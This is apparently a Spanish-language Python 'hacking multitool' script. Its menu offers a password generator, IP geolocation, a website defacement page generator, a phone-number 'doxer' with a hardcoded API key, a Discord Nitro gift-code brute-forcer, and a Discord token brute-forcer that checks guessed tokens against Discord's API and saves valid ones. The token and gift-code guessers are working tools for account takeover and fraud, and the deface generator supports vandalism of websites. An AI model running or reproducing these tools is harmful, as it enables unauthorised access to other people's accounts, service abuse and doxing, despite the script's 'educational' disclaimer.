#!/usr/bin/python

import webbrowser
import os
from time import sleep


B= '\033[30m'
R= '\033[31m'
G= '\033[32m'
Y= '\033[33m'
B= '\033[34m'
M= '\033[35m'
CY= '\033[36m'
W='\033[97m'

def createpsswd():
    from colorama import Fore, Back, Style
    import pyfiglet
    import random
    import string
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    symbols = "/*-+\\{}[]()<=>|_&^%$#@!?.,"
    numbers = "0123456789"
    all = lower + upper + symbols + numbers
    print(pyfiglet.figlet_format("Pass Creator"))
    while True:
        print("choose a option : ")
        print("1) Create a password\n2) Exit\n3) Help")
        choice = input("Enter a choose :")
        if choice == "1":
            length = int(input("Enter a lentght of password : "))
            password = "".join(random.sample(all, length))
            print("password : " + password)
            print("-"*40)
        elif choice == "2":
            break
        elif choice == "3":
            print("1)-> create a pass \n 2)-> enter a lengrh pass \n3)-> printed pass")
        else:
            print("Choose Invalid!" + W)

def ipscan():
    import json, urllib.request, webbrowser, os

    try:
        path=os.path.isfile('/data/data/com.termux/files/usr/bin/bash')
        def start():
            os.system('clear')
        def m3():
            try:
                print(R+"""\n
    #"""+Y+""" Elige una opción """+G+""" >>"""+R+"""
    1)"""+G+""" Ver información de tu IP """+R+"""
    2)"""+G+""" Ver información de otra IP"""+R+"""
    3)"""+G+""" Salir
    """)
                ch=int(input(CY+"Elige una opción: "+W))
                if ch==1:
                    main2()
                    m3()
                elif ch==2:
                    main()
                    m3()
                elif ch==3:
                    print(R+"GRACIAS POR USAR MI HERRAMIENTA. Ha sido un placer tratar con usted, que tenga un feliz dia"+W)
                else:
                    print(R+"\nOpción invalida! Prueba otra opción\n")
                    m3()
            except ValueError:
                print(R+"\nOpción invalida! Prueba otra opción\n")
                m3()
            
        def finder(u):
            try:
                try:
                    response = urllib.request.urlopen(u)
                    data = json.load(response)

                    print(R+"\n____________________________________________________")
                    print(Y+'\n>>>'+CY+' Detalles de la dirección ip\n ')
                    print(G+"1) Dirección IP : "+Y,data['query'],'\n')
                    print(G+"2) Organización : "+Y,data['org'],'\n')
                    print(G+"3) Ciudad : "+Y,data['city'],'\n')
                    print(G+"4) Region : "+Y,data['regionName'],'\n')
                    print(G+"5) País : "+Y,data['country'],'\n')
                    print(G+"6) Localización\n")
                    print(G+"\tLatitud : "+Y,data['lat'],'\n')
                    print(G+"\tLongitud : "+Y,data['lon'],'\n')
                    l='https://www.google.com/maps/place/'+str(data['lat'])+'+'+str(data['lon'])
                    print(R+"\n#"+G+" Link google maps : "+CY,l)
                    path=os.path.isfile('/data/data/com.termux/files/usr/bin/bash')
                    if path:
                        link='am start -a android.intent.action.VIEW -d '+str(l)
                        pr=input(R+"\n>>"+Y+" Abrir link en el navegador?"+G+" (y|n): "+W)
                        if pr=="y":
                            lnk=str(link)+" > /dev/null"
                            os.system(str(lnk))
                            start()
                            m3()
                        elif pr=="n":
                            print("\nVer otra IP o salir usando Ctrl + C\n\n")
                            start()
                            m3()
                        else:
                            print("\nOpción invalida! Prueba otra opción\n")
                            m3()
                    else:
                        pr=input(R+"\n>>"+G+" Abrir link en el navegador?"+Y+" (y|n): "+W)
                        if pr=="y":
                            webbrowser.open(l,new=0)
                            start()
                            m3()
                        elif pr=="n":
                            print(R+"\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                            print(Y+"\nVer otra IP o salir usando "+R+"Ctrl + C\n\n")
                            start()
                            m3()
                        else:
                            print(R+"\nOpción invalida! Prueba otra opción\n")
                            m3()
                    return
                except KeyError:
                    print(R+"\nError! IP Invalida/Dirección del sitio web!\n"+W)
                    m3()
            except urllib.error.URLError:
                print(R+"\nError!"+Y+" Por favor, comprueba tu conexión a internet!\n"+W)
                exit()

            
        def main():
            u=input(G+"\n>>> "+Y+"Introduce una dirección IP/Dirección del sitio web:"+W+" ")
            if u=="":
                print(R+"\nIntroduce una dirección IP valida/Dirección del sitio web!")
                main()
            else:
                url ='http://ip-api.com/json/'+u
                finder(url)
        def main2():
            url ='http://ip-api.com/json/'
            finder(url)
            
        start()
        m3()
    except KeyboardInterrupt:
        print(R+"\nInterrumpido ! Gracias por usar mi programa, que tengas un buen dia :)" +W)

def indexgen():

    Banner =G + """
    HTML CREATOR FOR DEFACE BY BLACK WOLF
    """

    print (Banner)
    title = input ("Enter the title: ")
    heading = input ("Enter the heading text: ")
    imagelink = input ("Enter the principal image location: ")
    bgimage = input("Enter the background image (Optional): ")
    message = input("Enter the message(Use <br> to step a line under): ")
    textcolor = input("Enter the font color (e.g. white): ")
    youtubeid = input("Enter the youtube ID: ")


    #Open the index
    fo = open("index.html","w")

    messagescript1 = """<html><head><title>"""

    messagescript2 = title

    messagescript3 = """</title></head>
    <body>
    <br>
    <link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Anton' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Josefin Sans' rel='stylesheet' type='text/css'>
    <body bgcolor="#000000" background ="""

    messagescript4 = bgimage

    messagescript5 = """><div class='CenterDiv'>
    <center>
    <h1><center><font color=\"red\" face=Orbitron>"""

    messagescript6 = heading

    messagescript7 = """<h1></font>
    <img src=""" 

    messagescript8 = imagelink

    messagescript9 = """ width=450px height=340px>
    <body onload="init()"></body>
    <body>
    <div id="bulle"></div>"""

    messagescript10 = """
    <script language=\"JavaScript\">
    var i=0
    var j=0
    var texteNE, affiche
    var texte=\"<br><br><br><br><br><font face=Orbitron color="""

    messagescript11 = textcolor

    messagescript12 = """ size=4>"""

    messagescript13 = message 

    messagescript14 = """<br><br></font><br></b></div>\"
    var ie = (document.all);
    var ne = (document.layers); 
    function init(){
    texteNE='';
    machine_a_ecrire();
    }
    function machine_a_ecrire(){
    texteNE=texteNE+texte.charAt(i)
    affiche='<font face=Orbitron size=1 color=#ffffff><strong>'+texteNE+'</strong></font>'
    if (texte.charAt(i)=="<") {
    j=1
    }
    if (texte.charAt(i)==">") {
    j=0
    }
    if (j==0) {
    if (document.getElementById) { // avec internet explorer
    document.getElementById("bulle").innerHTML = affiche;
    }
    }
    if (i<texte.length-1){
    i++
    setTimeout("machine_a_ecrire()",70)
    }
    else
    return
    }
    </script><font face="Orbitron" size="1"><blink><span style="color: rgb(255, 255, 255);"><b><font color=lime size=4></font></b></u></blink><br></font></b>
    <a href="http://veneno.ovh"><img style="position:fixed;bottom:0px;z-index:1000;right:-10px;"  src="http://i.imgur.com/dwxcIKA.gif" type="image/gif" width="150"></a></body>
    <!-- CSS --><style>
    .CenterDiv{width:650px;border:1px #ff0000 solid;padding:5px;margin:0px auto; background: url('http://i.imgur.com/sDbaMsW.gif');}
    </style>
    <br>
    <br>
    <br>
    <iframe width="0" height="0" src="http://www.youtube.com/v/"""

    messagescript15 = youtubeid

    messagescript16 = """&autoplay=1" frameborder="0"></iframe>"""


    fo.write(messagescript1)
    fo.write(messagescript2)
    fo.write(messagescript3)
    fo.write(messagescript4)
    fo.write(messagescript5)
    fo.write(messagescript6)
    fo.write(messagescript7)
    fo.write(messagescript8)
    fo.write(messagescript9)
    fo.write(messagescript10)
    fo.write(messagescript11)
    fo.write(messagescript12)
    fo.write(messagescript13)
    fo.write(messagescript14)
    fo.write(messagescript15)
    fo.write(messagescript16)

    print ("\The page has been generated as: index.html")

    fo.close()

def ipgen():
  import random

  def ip_generator():
      number = random.randint(0,255)
      return number

  print(f'IP is: {ip_generator()}.{ip_generator()}.{ip_generator()}.{ip_generator()}')

def infonum():
  import requests
  from getpass import _raw_input
  from colorama import Fore, init
  init()

  api = '510f8c00e437e5c107b8629d2fe5ca20'


  numero = int(_raw_input("\nIntroduce un numero: "))

  info = requests.get("http://apilayer.net/api/validate?access_key=%s&number=%s&country_code&format=1" % (api, numero))

  for key, valor in info.json().items():
      print("\n%s: %s" % (key, valor) + W)

def discordnitro():
  import os
  from os import remove
  import re
  import json
  import random
  import string
  import requests
  import webbrowser
  import time
  from time import sleep
  from requests import get 


  print("Recuerda borrar los codigos de  /Codes.txt/ despues de chekearlos (si los chekeaste ya claro esta, si no puedes dejarlos) ")
  sleep(2)
  print("""
      """)
  amount = int(input('Introduce la cantidad de codigos a generar: '))
  value = 1
  while value <= amount:
              code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
              f = open('Codes.txt', "+a")
              f.write(f'{code}\n')
              f.close()
              print(f'[GENERADO] {code}')
              value += 1 
  print("Presionaste Ctrl + C")
      
  sleep(2)
  print("Te gustaria chekear los codigos? ")
  sleep(2.5)
  eleccion = input("Si/No: ")
  try:
          if eleccion == "si" or "Si":
              with open("Codes.txt") as f:
                  for line in f:
                      nitro = line.strip("\n")

                      url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

                      r = get(url)

                      if r.status_code == 200:
                          print(" Valido | {} ".format(line.strip("\n")))
                          f = open('Hits.txt', "+a")
                          f.write("{}\n".format(line.strip("\n")))
                          break
                      else:
                          print(" Invalido | {} ".format(line.strip("\n")))
                          f = open('Bad.txt', "+a")
                          f.write("{}\n".format(line.strip("\n")))
                          
          else:
              print("Okey")
  except KeyboardInterrupt:
          print("Presionaste Ctrl + C")
          exit()

def tokendiscord():
  import discord
  import string
  import requests as req
  import requests 
  import datetime
  import random
  import time
  import base64
  from threading import Thread as thr
  import os
  from colorama import Fore
  import discord, os, json
  from discord.ext import commands
  from discord.ext.commands import Bot
  from plyer import notification
  from tkinter import messagebox
  from urllib.request import urlopen, Request

  os.system(f'Discord token gen by BLACK WOLF')

  def random_token_discord_gen():
              request_url = "https://discordapp.com/api/v8/users/@me"

              def check1():
                      token1 = ""
                      while True:
                          try:
                              ids = list(['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])
                              ide = ('').join(random.choices(ids, k=18))
                              ideutf8 = ide.encode("UTF-8")
                              ideencode = base64.b64encode(ideutf8)
                              ideencode1 = ideencode.decode("UTF-8")

                              caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
                              token1 = ideencode1 + ('').join(random.choices(caracteres, k=35))

                              headers = {'Authorization': token1, 'Content-Type': 'application/json'}  
                              req = requests.get(request_url, headers=headers)

                              if req.status_code == 401:
                                  print(f"Inválido | {token1}")
                                  f = open('tokens_discord_invalidos.txt', "+a")
                                  f.write(f'{token1}\n')
                                  f.close()

                              elif req.status_code == 200:
                                  print(f"Válido | {token1}")
                                  f = open('token_discord_valido.txt', "+a")
                                  f.write(f'{token1}\n')
                                  f.close()
                                  messagebox.showinfo(message=f"¡Token valido encontrado!", title="Token Gen Jank-Multitool")
                                  break
                          except KeyboardInterrupt:
                              print("")
                              print(f"Presionaste Ctrl + C")
                              break
                          
                          
              check1()
  random_token_discord_gen()
  print("Presionaste Ctrl + C")

def RRSS():
    print(R+"[" +Y+ "+" +R+ "]" +B+ "MIS REDES SOCIALES:")
    print(R+"[" +Y+ "+" +R+ "]" +B+ "Instagram: https://instagram.com/black_wolf.es")
    print(R+"[" +Y+ "+" +R+ "]" +B+ "GitHub: https://github.com/JMR3Y")
    print(R+"[" +Y+ "+" +R+ "]" +B+ "YouTube: https://www.youtube.com/@DarkCloud_HRS")



os.system('clear')

print(CY+"""
 _     _            _              _    _ _   
| |__ | | __ _  ___| | __         | | _(_) |_ 
| '_ \| |/ _` |/ __| |/ /  _____  | |/ / | __|
| |_) | | (_| | (__|   <  |_____| |   <| | |_ 
|_.__/|_|\__,_|\___|_|\_\         |_|\_\_|\__|
                                              
      
      [*] BY        BLACKWOLF
      [*] ORG       ELITE 6-27
      [*] GITHUB    github.com/JMR3Y
      [*] VERSION   v1.0 
                                         """)

print (R+"_______________________________________________")
print (M+"""
NO ME HAGO RESPONSABLE DEL MAL USO QUE SE LE PUEDA DAR A DICHA HERRAMIENTA.
HA SIDO CREADA CON FINES EDUCATIVOS, NO MALICIOSOS.
""")
print (R+"""_______________________________________________
""")

sleep(1)
print(G + "1: Generador de constraseñas seguras")
sleep(1)
print(G + "2: Escaner de direcciones IP")
sleep(1)
print(G + "3: Generador de index para deface")
sleep(1)
print(G + "4: Generador de direcciones ip")
sleep(1)
print(G + "5: Obtener información de un número")
sleep(1)
print(G + "6: Generador de nitro ")
sleep(1)
print(G + "7: Generador tokens de discord")
sleep(1)
print(G + "8: Apoyame en mis redes sociales")
sleep(1)


sleep(2)
eleccion = int(input(Y + "Introduce tu eleccion: "))
if eleccion == 1:
  print("Elegiste el generador de contraseñas" + G)
  os.system('clear')
  createpsswd()
elif eleccion == 2:
  print("Elegiste el escaner de direcciones IP" + G)
  os.system('clear')
  ipscan()
elif eleccion == 3:
  print("Selecionaste el generador de index para deface" + G)
  os.system('clear')
  indexgen()
elif eleccion == 4:
  print("Selecionaste el generador de direcciones IP" + G)
  os.system('clear')
  ipgen()
elif eleccion == 5:
  print("Selecionaste el Doxer Num" + G)
  os.system('clear')
  infonum()
elif eleccion == 6:
  print("Selecionaste el generador de Discord Nitro" + G)
  discordnitro()
elif eleccion == 7:
  print("Selecionaste el Generador de Tokens de Discord")
  tokendiscord()
elif eleccion == 8:
  print("Aquí nte dejo mis redes")
  RRSS()
else:
  print(R + "Escoge una opcion valida")